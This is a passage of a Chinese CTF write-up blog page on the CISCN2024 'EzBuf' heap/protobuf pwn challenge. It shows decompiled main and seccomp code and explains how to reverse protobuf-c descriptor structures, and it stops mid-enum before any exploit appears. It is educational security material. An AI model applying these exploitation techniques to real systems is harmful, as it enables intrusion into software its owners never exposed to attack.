@@ -1,0 +1,1604 @@
+<!DOCTYPE html>
+<html lang="en">
+    <!-- title -->
+
+
+    
+
+<!-- keywords -->
+
+
+
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
+    <meta name="author" content="John Doe">
+    <meta name="renderer" content="webkit">
+    <meta name="copyright" content="John Doe">
+    
+        <meta name="keywords" content="hexo,hexo-theme,hexo-blog,blog,pwn,heap">
+    
+    <meta name="description" content="">
+    <meta name="description" content="题目分析 到手一拖史不知道是什么，逆向扣了符号表，很多函数根本看不懂。  字符串交叉引用到主函数，发现首先是开沙箱（这里第一次没注意到没有load规则是个假的沙箱但是本来也没办法就没管）。 主函数： 1234567891011121314151617181920212223void __fastcall __noreturn main(__int64 a1, char **a2, char **a">
+<meta property="og:type" content="article">
+<meta property="og:title" content="How2Heap&amp;Protobuf实战——CISCN2024EzBuf">
+<meta property="og:url" content="http://example.com/2024/09/05/How2Heap-Protobuf%E5%AE%9E%E6%88%98%E2%80%94%E2%80%94CISCN2024EzBuf/index.html">
+<meta property="og:site_name" content="Hexo">
+<meta property="og:description" content="题目分析 到手一拖史不知道是什么，逆向扣了符号表，很多函数根本看不懂。  字符串交叉引用到主函数，发现首先是开沙箱（这里第一次没注意到没有load规则是个假的沙箱但是本来也没办法就没管）。 主函数： 1234567891011121314151617181920212223void __fastcall __noreturn main(__int64 a1, char **a2, char **a">
+<meta property="og:locale" content="en_US">
+<meta property="article:published_time" content="2024-09-05T10:52:39.000Z">
+<meta property="article:modified_time" content="2024-09-05T12:57:23.235Z">
+<meta property="article:author" content="John Doe">
+<meta property="article:tag" content="pwn">
+<meta property="article:tag" content="heap">
+<meta property="article:tag" content="protobuf">
+<meta name="twitter:card" content="summary">
+    <meta http-equiv="Cache-control" content="no-cache">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
+    <link rel="icon" href="/assets/favicon.ico">
+    
+    <title>How2Heap&amp;Protobuf实战——CISCN2024EzBuf · Zj_W1nd&#39;s BLOG</title>
+    <!-- /*! loadCSS. [c]2017 Filament Group, Inc. MIT License */
+/* This file is meant as a standalone workflow for
+- testing support for link[rel=preload]
+- enabling async CSS loading in browsers that do not support rel=preload
+- applying rel preload css once loaded, whether supported or not.
+*/ -->
+<script>
+    (function (w) {
+        'use strict'
+        // rel=preload support test
+        if (!w.loadCSS) {
+            w.loadCSS = function () {}
+        }
+        // define on the loadCSS obj
+        var rp = (loadCSS.relpreload = {})
+        // rel=preload feature support test
+        // runs once and returns a function for compat purposes
+        rp.support = (function () {
+            var ret
+            try {
+                ret = w.document.createElement('link').relList.supports('preload')
+            } catch (e) {
+                ret = false
+            }
+            return function () {
+                return ret
+            }
+        })()
+
+        // if preload isn't supported, get an asynchronous load by using a non-matching media attribute
+        // then change that media back to its intended value on load
+        rp.bindMediaToggle = function (link) {
+            // remember existing media attr for ultimate state, or default to 'all'
+            var finalMedia = link.media || 'all'
+
+            function enableStylesheet() {
+                link.media = finalMedia
+            }
+
+            // bind load handlers to enable media
+            if (link.addEventListener) {
+                link.addEventListener('load', enableStylesheet)
+            } else if (link.attachEvent) {
+                link.attachEvent('onload', enableStylesheet)
+            }
+
+            // Set rel and non-applicable media type to start an async request
+            // note: timeout allows this to happen async to let rendering continue in IE
+            setTimeout(function () {
+                link.rel = 'stylesheet'
+                link.media = 'only x'
+            })
+            // also enable media after 3 seconds,
+            // which will catch very old browsers (android 2.x, old firefox) that don't support onload on link
+            setTimeout(enableStylesheet, 3000)
+        }
+
+        // loop through link elements in DOM
+        rp.poly = function () {
+            // double check this to prevent external calls from running
+            if (rp.support()) {
+                return
+            }
+            var links = w.document.getElementsByTagName('link')
+            for (var i = 0; i < links.length; i++) {
+                var link = links[i]
+                // qualify links to those with rel=preload and as=style attrs
+                if (
+                    link.rel === 'preload' &&
+                    link.getAttribute('as') === 'style' &&
+                    !link.getAttribute('data-loadcss')
+                ) {
+                    // prevent rerunning on link
+                    link.setAttribute('data-loadcss', true)
+                    // bind listeners to toggle media back
+                    rp.bindMediaToggle(link)
+                }
+            }
+        }
+
+        // if unsupported, run the polyfill
+        if (!rp.support()) {
+            // run once at least
+            rp.poly()
+
+            // rerun poly on an interval until onload
+            var run = w.setInterval(rp.poly, 500)
+            if (w.addEventListener) {
+                w.addEventListener('load', function () {
+                    rp.poly()
+                    w.clearInterval(run)
+                })
+            } else if (w.attachEvent) {
+                w.attachEvent('onload', function () {
+                    rp.poly()
+                    w.clearInterval(run)
+                })
+            }
+        }
+
+        // commonjs
+        if (typeof exports !== 'undefined') {
+            exports.loadCSS = loadCSS
+        } else {
+            w.loadCSS = loadCSS
+        }
+    })(typeof global !== 'undefined' ? global : this)
+</script>
+
+    <style type="text/css">
+    @font-face {
+        font-family: 'Oswald-Regular';
+        src: url("/font/Oswald-Regular.ttf");
+    }
+
+    body {
+        margin: 0;
+    }
+
+    header,
+    footer,
+    .back-top,
+    .sidebar,
+    .container,
+    .site-intro-meta,
+    .toc-wrapper {
+        display: none;
+    }
+
+    .site-intro {
+        position: relative;
+        z-index: 3;
+        width: 100%;
+        /* height: 50vh; */
+        overflow: hidden;
+    }
+
+    .site-intro-placeholder {
+        position: absolute;
+        z-index: -2;
+        top: 0;
+        left: 0;
+        width: calc(100% + 300px);
+        height: 100%;
+        background: repeating-linear-gradient(-45deg, #444 0, #444 80px, #333 80px, #333 160px);
+        background-position: center center;
+        transform: translate3d(-226px, 0, 0);
+        animation: gradient-move 2.5s ease-out 0s infinite;
+    }
+
+    @keyframes gradient-move {
+        0% {
+            transform: translate3d(-226px, 0, 0);
+        }
+        100% {
+            transform: translate3d(0, 0, 0);
+        }
+    }
+</style>
+
+    <link rel="preload" href="/css/style.css?v=20211217" as="style" onload="this.onload=null;this.rel='stylesheet'">
+    <link rel="preload" href="/css/dark.css?v=20211217" as="style">
+    <link rel="stylesheet" href="/css/dark.css">
+    <link rel="stylesheet" href="/css/mobile.css?v=20211217" media="(max-width: 960px)">
+    <link rel="preload" href="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
+    <link rel="preload" href="https://cdn.jsdelivr.net/npm/jquery@3.6.0/dist/jquery.min.js" as="script">
+    <link rel="preload" href="/scripts/main.js?v=20211217" as="script">
+    <link rel="preload" href="/scripts/dark.js?v=20211217" as="script">
+    <link rel="preload" href="/font/Oswald-Regular.ttf" as="font" crossorigin>
+    <link rel="preload" href="https://at.alicdn.com/t/font_327081_1dta1rlogw17zaor.woff" as="font" crossorigin>
+    <!-- algolia -->
+    
+    <!-- 百度统计  -->
+    
+    <!-- Google tag (gtag.js) -->
+    
+
+<meta name="generator" content="Hexo 6.3.0"></head>
+
+    <script src="https://cdn.jsdelivr.net/npm/jquery@3.6.0/dist/jquery.min.js"></script>
+    <script type="text/javascript">
+        if (typeof window.$ == undefined) {
+            console.warn('jquery load from jsdelivr failed, will load local script')
+            document.write('<script src="/lib/jquery.min.js" />')
+        }
+    </script>
+    
+        <body class="post-body">
+    
+        <!-- header -->
+        <header class="header header-mobile">
+    <!-- top read progress line -->
+    <div class="header-element">
+        <div class="read-progress"></div>
+    </div>
+    <!-- sidebar menu button -->
+    <div class="header-element">
+        
+            <div class="header-sidebar-menu">
+        
+            
+                <div style="padding-left: 1px;">&#xe775;</div>
+            
+        </div>
+    </div>
+    <!-- header actions -->
+    <div class="header-actions">
+        <!-- theme mode switch button -->
+        <span class="header-theme-btn header-element">
+            <i class="fas fa-adjust"></i>
+        </span>
+        <!-- back to home page text -->
+        <span class="home-link header-element">
+            <a href=/>Zj_W1nd's BLOG</a>
+        </span>
+    </div>
+    <!-- toggle banner for post layout -->
+    
+        
+            <div class="banner">
+        
+            <div class="blog-title header-element">
+                <a href="/">Zj_W1nd&#39;s BLOG</a>
+            </div>
+            <div class="post-title header-element">
+                <a href="#" class="post-name">How2Heap&Protobuf实战——CISCN2024EzBuf</a>
+            </div>
+        </div>
+    
+</header>
+
+        <!-- fixed footer -->
+        <footer class="footer-fixed">
+    <!-- back to top button -->
+    <div class="footer-fixed-element">
+        
+            <div class="back-top back-top-hidden">
+        
+        
+            <div>&#xe639;</div>
+        
+        </div>
+    </div>
+</footer>
+
+        <!-- wrapper -->
+        <div class="wrapper">
+            <div class="site-intro" style="
+
+
+
+
+
+
+
+    height:50vh;
+
+">
+    
+    <!-- 主页  -->
+    
+        
+    <!-- 404页  -->
+    
+    <div class="site-intro-placeholder"></div>
+    <div class="site-intro-img" style="background-image: url(/intro/post-bg.jpg)"></div>
+    <div class="site-intro-meta">
+        <!-- 标题  -->
+        <h1 class="intro-title">
+            <!-- 主页  -->
+            
+                How2Heap&Protobuf实战——CISCN2024EzBuf
+            <!-- 404 -->
+            
+        </h1>
+        <!-- 副标题 -->
+        <p class="intro-subtitle">
+            <!-- 主页副标题  -->
+            
+                
+            <!-- 404 -->
+            
+        </p>
+        <!-- 文章页 meta -->
+        
+            <div class="post-intros">
+                <!-- 文章页标签  -->
+                
+                    <div class= post-intro-tags >
+    
+    
+        <a class="post-tag" href="javascript:void(0);" data-tags="pwn">pwn</a>
+    
+        <a class="post-tag" href="javascript:void(0);" data-tags="heap">heap</a>
+    
+        <a class="post-tag" href="javascript:void(0);" data-tags="protobuf">protobuf</a>
+    
+</div>
+
+                
+                <!-- 文章字数统计 -->
+                
+                <div class="post-intro-meta">
+                    <!-- 撰写日期 -->
+                    <span class="iconfont-archer post-intro-calander">&#xe676;</span>
+                    <span class="post-intro-time">2024/09/05</span>
+                    <!-- busuanzi -->
+                    
+                        <span id="busuanzi_container_page_pv" class="busuanzi-pv">
+                            <span class="iconfont-archer post-intro-busuanzi">&#xe602;</span>
+                            <span id="busuanzi_value_page_pv"></span>
+                        </span>
+                    
+                    <!-- 文章分享 -->
+                    <span class="share-wrapper">
+                        <span class="iconfont-archer share-icon">&#xe71d;</span>
+                        <span class="share-text">Share</span>
+                        <ul class="share-list">
+                            <li class="iconfont-archer share-qr" data-type="qr">&#xe75b;
+                                <div class="share-qrcode"></div>
+                            </li>
+                            <li class="iconfont-archer" data-type="weibo">&#xe619;</li>
+                            <li class="iconfont-archer" data-type="qzone">&#xe62e;</li>
+                            <li class="iconfont-archer" data-type="twitter">&#xe634;</li>
+                            <li class="iconfont-archer" data-type="facebook">&#xe67a;</li>
+                        </ul>
+                    </span>
+                </div>
+            </div>
+        
+    </div>
+</div>
+
+            <script>
+  // get user agent
+  function getBrowserVersions() {
+    var u = window.navigator.userAgent
+    return {
+      userAgent: u,
+      trident: u.indexOf('Trident') > -1, //IE内核
+      presto: u.indexOf('Presto') > -1, //opera内核
+      webKit: u.indexOf('AppleWebKit') > -1, //苹果、谷歌内核
+      gecko: u.indexOf('Gecko') > -1 && u.indexOf('KHTML') == -1, //火狐内核
+      mobile: !!u.match(/AppleWebKit.*Mobile.*/), //是否为移动终端
+      ios: !!u.match(/\(i[^;]+;( U;)? CPU.+Mac OS X/), //ios终端
+      android: u.indexOf('Android') > -1 || u.indexOf('Linux') > -1, //android终端或者uc浏览器
+      iPhone: u.indexOf('iPhone') > -1 || u.indexOf('Mac') > -1, //是否为iPhone或者安卓QQ浏览器
+      iPad: u.indexOf('iPad') > -1, //是否为iPad
+      webApp: u.indexOf('Safari') == -1, //是否为web应用程序，没有头部与底部
+      weixin: u.indexOf('MicroMessenger') == -1, //是否为微信浏览器
+      uc: u.indexOf('UCBrowser') > -1, //是否为android下的UC浏览器
+    }
+  }
+  var browser = {
+    versions: getBrowserVersions(),
+  }
+  console.log('userAgent: ' + browser.versions.userAgent)
+
+  // callback
+  function fontLoaded() {
+    console.log('font loaded')
+    if (document.getElementsByClassName('site-intro-meta')) {
+      document
+        .getElementsByClassName('intro-title')[0]
+        .classList.add('intro-fade-in')
+      document
+        .getElementsByClassName('intro-subtitle')[0]
+        .classList.add('intro-fade-in')
+      var postIntros = document.getElementsByClassName('post-intros')[0]
+      if (postIntros) {
+        postIntros.classList.add('post-fade-in')
+      }
+    }
+  }
+
+  // UC不支持跨域，所以直接显示
+  function asyncCb() {
+    if (browser.versions.uc) {
+      console.log('UCBrowser')
+      fontLoaded()
+    } else {
+      WebFont.load({
+        custom: {
+          families: ['Oswald-Regular'],
+        },
+        loading: function () {
+          // 所有字体开始加载
+          // console.log('font loading');
+        },
+        active: function () {
+          // 所有字体已渲染
+          fontLoaded()
+        },
+        inactive: function () {
+          // 字体预加载失败，无效字体或浏览器不支持加载
+          console.log('inactive: timeout')
+          fontLoaded()
+        },
+        timeout: 5000, // Set the timeout to two seconds
+      })
+    }
+  }
+
+  function asyncErr() {
+    console.warn('script load from CDN failed, will load local script')
+  }
+
+  // load webfont-loader async, and add callback function
+  function async(u, cb, err) {
+    var d = document,
+      t = 'script',
+      o = d.createElement(t),
+      s = d.getElementsByTagName(t)[0]
+    o.src = u
+    if (cb) {
+      o.addEventListener(
+        'load',
+        function (e) {
+          cb(null, e)
+        },
+        false
+      )
+    }
+    if (err) {
+      o.addEventListener(
+        'error',
+        function (e) {
+          err(null, e)
+        },
+        false
+      )
+    }
+    s.parentNode.insertBefore(o, s)
+  }
+
+  var asyncLoadWithFallBack = function (arr, success, reject) {
+    var currReject = function () {
+      reject()
+      arr.shift()
+      if (arr.length) async(arr[0], success, currReject)
+    }
+
+    async(arr[0], success, currReject)
+  }
+
+  asyncLoadWithFallBack(
+    [
+      'https://cdn.jsdelivr.net/npm/webfontloader@1.6.28/webfontloader.min.js',
+      'https://cdn.bootcss.com/webfont/1.6.28/webfontloader.js',
+      "/lib/webfontloader.min.js",
+    ],
+    asyncCb,
+    asyncErr
+  )
+</script>
+
+            <img class="loading" src="/assets/loading.svg" style="display: block; margin: 6rem auto 0 auto; width: 6rem; height: 6rem;" />
+            <div class="container container-unloaded">
+                <main class="main post-page">
+    <article class="article-entry">
+        <h1 id="题目分析"><a href="#题目分析" class="headerlink" title="题目分析"></a>题目分析</h1><blockquote>
+<p>到手一拖史不知道是什么，逆向扣了符号表，很多函数根本看不懂。</p>
+</blockquote>
+<p>字符串交叉引用到主函数，发现首先是开沙箱（这里第一次没注意到没有load规则是个假的沙箱但是本来也没办法就没管）。</p>
+<p>主函数：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> __fastcall __noreturn <span class="title function_">main</span><span class="params">(__int64 a1, <span class="type">char</span> **a2, <span class="type">char</span> **a3)</span></span><br><span class="line">&#123;</span><br><span class="line">  __int64 read_ret; <span class="comment">// rsi</span></span><br><span class="line">  __int64 v4; <span class="comment">// [rsp+28h] [rbp-8h]</span></span><br><span class="line">  init_and_seccomp(a1, a2, a3);<span class="comment">//假的</span></span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;WHAT DO YOU WANT?\n&quot;</span>);</span><br><span class="line">    read_ret = (<span class="type">int</span>)read(<span class="number">0</span>, buf, <span class="number">0x200</span>uLL);</span><br><span class="line">    v4 = unpack1(<span class="number">0LL</span>, read_ret, buf);           <span class="comment">// 这里面调用了malloc(0x48)，会切0x50出去，初始smallbin 0xd0</span></span><br><span class="line">    <span class="keyword">if</span> ( !v4 )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    menu(</span><br><span class="line">      *(_QWORD *)(v4 + <span class="number">24</span>),</span><br><span class="line">      *(_QWORD *)(v4 + <span class="number">32</span>),</span><br><span class="line">      *(_QWORD *)(v4 + <span class="number">40</span>),</span><br><span class="line">      *(_QWORD *)(v4 + <span class="number">48</span>),</span><br><span class="line">      *(_QWORD *)(v4 + <span class="number">56</span>),</span><br><span class="line">      *(_DWORD *)(v4 + <span class="number">64</span>));</span><br><span class="line">    buf = (<span class="type">char</span> *)<span class="built_in">malloc</span>(<span class="number">0x200</span>uLL);</span><br><span class="line">  &#125;</span><br><span class="line">  quit(<span class="number">0LL</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>沙箱也是光有rule没有load，而且开了沙箱就意味着我们起始的堆布局会比较乱：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">setbuf(<span class="built_in">stdin</span>, <span class="number">0LL</span>);</span><br><span class="line">setbuf(<span class="built_in">stdout</span>, <span class="number">0LL</span>);</span><br><span class="line">setbuf(<span class="built_in">stderr</span>, <span class="number">0LL</span>);</span><br><span class="line">seccomp_rules = seccomp_init(<span class="number">2147418112LL</span>);</span><br><span class="line">seccomp_rule_add(seccomp_rules, <span class="number">0LL</span>, <span class="number">257LL</span>, <span class="number">0LL</span>);</span><br><span class="line">seccomp_rule_add(seccomp_rules, <span class="number">0LL</span>, <span class="number">19LL</span>, <span class="number">0LL</span>);</span><br><span class="line">seccomp_rule_add(seccomp_rules, <span class="number">0LL</span>, <span class="number">20LL</span>, <span class="number">0LL</span>);</span><br><span class="line">seccomp_rule_add(seccomp_rules, <span class="number">0LL</span>, <span class="number">0LL</span>, <span class="number">0LL</span>);</span><br><span class="line">seccomp_rule_add(seccomp_rules, <span class="number">0LL</span>, <span class="number">17LL</span>, <span class="number">0LL</span>);</span><br><span class="line">seccomp_rule_add(seccomp_rules, <span class="number">0LL</span>, <span class="number">18LL</span>, <span class="number">0LL</span>);</span><br><span class="line">seccomp_rule_add(seccomp_rules, <span class="number">0LL</span>, <span class="number">59LL</span>, <span class="number">0LL</span>);</span><br><span class="line">seccomp_rule_add(seccomp_rules, <span class="number">0LL</span>, <span class="number">303LL</span>, <span class="number">0LL</span>);</span><br><span class="line">seccomp_rule_add(seccomp_rules, <span class="number">0LL</span>, <span class="number">304LL</span>, <span class="number">0LL</span>);</span><br><span class="line">seccomp_rule_add(seccomp_rules, <span class="number">0LL</span>, <span class="number">322LL</span>, <span class="number">0LL</span>);</span><br><span class="line">seccomp_rule_add(seccomp_rules, <span class="number">0LL</span>, <span class="number">327LL</span>, <span class="number">0LL</span>);</span><br><span class="line">seccomp_rule_add(seccomp_rules, <span class="number">0LL</span>, <span class="number">328LL</span>, <span class="number">0LL</span>);</span><br><span class="line">seccomp_rule_add(seccomp_rules, <span class="number">0LL</span>, <span class="number">428LL</span>, <span class="number">0LL</span>);</span><br><span class="line">seccomp_rule_add(seccomp_rules, <span class="number">0LL</span>, <span class="number">437LL</span>, <span class="number">0LL</span>);</span><br><span class="line">seccomp_rule_add(seccomp_rules, <span class="number">0LL</span>, <span class="number">327LL</span>, <span class="number">0LL</span>);</span><br><span class="line">seccomp_rule_add(seccomp_rules, <span class="number">0LL</span>, <span class="number">296LL</span>, <span class="number">0LL</span>);</span><br><span class="line">seccomp_rule_add(seccomp_rules, <span class="number">0LL</span>, <span class="number">295LL</span>, <span class="number">0LL</span>);</span><br><span class="line">buf = (<span class="type">char</span> *)<span class="built_in">malloc</span>(<span class="number">0x410</span>uLL);</span><br><span class="line"><span class="keyword">return</span> <span class="built_in">malloc</span>(<span class="number">0x410</span>uLL);</span><br></pre></td></tr></table></figure>
+<p>输入没有提示直接报错，看下面的函数，read我们的输入之后把我们的输入传入了一个神秘函数，完全看不懂。但是内部真正调用的函数指针有一个写好的参数，里面有点奇怪的字符串，heybro之类的：</p>
+<p>到这其实就进行不下去了，下面的函数能猜到是菜单但是参数十分混乱，看不懂，遂上网搜索。</p>
+<h1 id="Protobuf"><a href="#Protobuf" class="headerlink" title="Protobuf"></a>Protobuf</h1><p>这个程序使用了谷歌开发的一种叫做protobuf的序列化协议进行交互的。参考看雪上<a target="_blank" rel="noopener" href="https://bbs.kanxue.com/thread-282203.htm">这篇文章</a>（讲的很详细，一篇够了）。protobuf是一种类似json的数据流格式，通过.proto文件定义好结构体后借助protoc编译，能将其自动转成各种语言的头文件（内含接口，包括C，python，go等等）供开发使用，还是挺方便的。文章中提到了ciscn2024这道题目，那么我们首先的任务就是逆向出protobuf结构体。</p>
+<blockquote>
+<p>这里还了解到ida其实是有插件的，也有一些别的工具能识别二进制文件里的protobuf结构，但是我都尝试了都分析不了（看到别的师傅的wp也是如此，都是手动分析的）</p>
+</blockquote>
+<p>对C语言来说，整个protobuf的结构体信息被<code>ProtobufCMessageDescriptor</code>维护，首先要做的就是定位他的magic头，一般是<code>0x28AAEEF9</code>。</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">ProtobufCMessageDescriptor</span> &#123;</span></span><br><span class="line">    <span class="comment">/** Magic value checked to ensure that the API is used correctly. */</span></span><br><span class="line">    <span class="type">uint32_t</span>            magic;</span><br><span class="line">    <span class="comment">/** The qualified name (e.g., &quot;namespace.Type&quot;). */</span></span><br><span class="line">    <span class="type">const</span> <span class="type">char</span>          *name;</span><br><span class="line">    <span class="comment">/** The unqualified name as given in the .proto file (e.g., &quot;Type&quot;). */</span></span><br><span class="line">    <span class="type">const</span> <span class="type">char</span>          *short_name;</span><br><span class="line">    <span class="comment">/** Identifier used in generated C code. */</span></span><br><span class="line">    <span class="type">const</span> <span class="type">char</span>          *c_name;</span><br><span class="line">    <span class="comment">/** The dot-separated namespace. */</span></span><br><span class="line">    <span class="type">const</span> <span class="type">char</span>          *package_name;</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * Size in bytes of the C structure representing an instance of this</span></span><br><span class="line"><span class="comment">     * type of message.</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="type">size_t</span>              sizeof_message;</span><br><span class="line">    <span class="comment">/** Number of elements in `fields`. */</span></span><br><span class="line">    <span class="type">unsigned</span>            n_fields;</span><br><span class="line">    <span class="comment">/** Field descriptors, sorted by tag number. */</span></span><br><span class="line">    <span class="type">const</span> ProtobufCFieldDescriptor  *fields;</span><br><span class="line">    <span class="comment">/** Used for looking up fields by name. */</span></span><br><span class="line">    <span class="type">const</span> <span class="type">unsigned</span>          *fields_sorted_by_name;</span><br><span class="line">    <span class="comment">/** Number of elements in `field_ranges`. */</span></span><br><span class="line">    <span class="type">unsigned</span>            n_field_ranges;</span><br><span class="line">    <span class="comment">/** Used for looking up fields by id. */</span></span><br><span class="line">    <span class="type">const</span> ProtobufCIntRange     *field_ranges;</span><br><span class="line">    <span class="comment">/** Message initialisation function. */</span></span><br><span class="line">    ProtobufCMessageInit        message_init;</span><br><span class="line">    ...<span class="comment">//三个保留字段，没有</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
+<p>其中，结构体的每个字段被一个<code>ProtobufCFieldDescriptor</code>结构体维护：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">ProtobufCFieldDescriptor</span> &#123;</span></span><br><span class="line">    <span class="comment">/** Name of the field as given in the .proto file. */</span></span><br><span class="line">    <span class="type">const</span> <span class="type">char</span>      *name;</span><br><span class="line">    <span class="comment">/** Tag value of the field as given in the .proto file. */</span></span><br><span class="line">    <span class="type">uint32_t</span>        id;</span><br><span class="line">    <span class="comment">/** Whether the field is `REQUIRED`, `OPTIONAL`, or `REPEATED`. */</span></span><br><span class="line">    ProtobufCLabel      label;</span><br><span class="line">    <span class="comment">/** The type of the field. */</span></span><br><span class="line">    ProtobufCType       type;</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * The offset in bytes of the message&#x27;s C structure&#x27;s quantifier field</span></span><br><span class="line"><span class="comment">     * (the `has_MEMBER` field for optional members or the `n_MEMBER` field</span></span><br><span class="line"><span class="comment">     * for repeated members or the case enum for oneofs).</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="type">unsigned</span>        quantifier_offset;</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * The offset in bytes into the message&#x27;s C structure for the member</span></span><br><span class="line"><span class="comment">     * itself.</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="type">unsigned</span>        offset;</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * A type-specific descriptor.</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * If `type` is `PROTOBUF_C_TYPE_ENUM`, then `descriptor` points to the</span></span><br><span class="line"><span class="comment">     * corresponding `ProtobufCEnumDescriptor`.</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * If `type` is `PROTOBUF_C_TYPE_MESSAGE`, then `descriptor` points to</span></span><br><span class="line"><span class="comment">     * the corresponding `ProtobufCMessageDescriptor`.</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * Otherwise this field is NULL.</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="type">const</span> <span class="type">void</span>      *descriptor; <span class="comment">/* for MESSAGE and ENUM types */</span></span><br><span class="line"> </span><br><span class="line">    <span class="comment">/** The default value for this field, if defined. May be NULL. */</span></span><br><span class="line">    <span class="type">const</span> <span class="type">void</span>      *default_value;</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * A flag word. Zero or more of the bits defined in the</span></span><br><span class="line"><span class="comment">     * `ProtobufCFieldFlag` enum may be set.</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="type">uint32_t</span>        flags;</span><br><span class="line">    ...<span class="comment">// Reserved data</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
+<p>这里面涉及到我们还原的有两个枚举类型，label和type</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">enum</span> &#123;</span></span><br><span class="line">    PROTOBUF_C_LABEL_REQUIRED,</span><br><span class="line">    PROTOBUF_C_LABEL_OPTIONAL,</span><br><span class="line">    PROTOBUF_C_LABEL_REPEATED,</span><br><span class="line">    PROTOBUF_C_LABEL_NONE,</span><br><span class="line">&#125; ProtobufCLabel;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">enum</span> &#123;</span></span><br><span class="line">    PROTOBUF_C_TYPE_INT32,      <span class="comment">/**&lt; int32 */</span></span><br><span class="line">    PROTOBUF_C_TYPE_SINT32,     <span class="comment">/**&lt; signed int32 */</span></span><br><span class="line">    PROTOBUF_C_TYPE_SFIXED32,   <span class="comment">/**&lt; signed int32 (4 bytes) */</span></span><br><span class="line">    PROTOBUF_C_TYPE_INT64,      